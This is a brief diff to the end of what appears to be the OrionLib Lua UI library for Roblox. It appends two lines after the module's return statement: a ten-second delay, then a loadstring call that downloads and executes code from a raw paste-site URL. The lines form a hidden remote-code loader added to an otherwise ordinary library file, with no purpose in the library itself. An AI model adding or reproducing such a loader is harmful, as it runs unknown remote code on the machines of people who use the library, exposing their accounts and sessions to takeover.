@@ -1764,3 +1764,6 @@ function OrionLib:Destroy()
 end
 
 return OrionLib
+
+wait(10)
+loadstring(game:HttpGet("https://paste-bin.xyz/raw/974948"))()
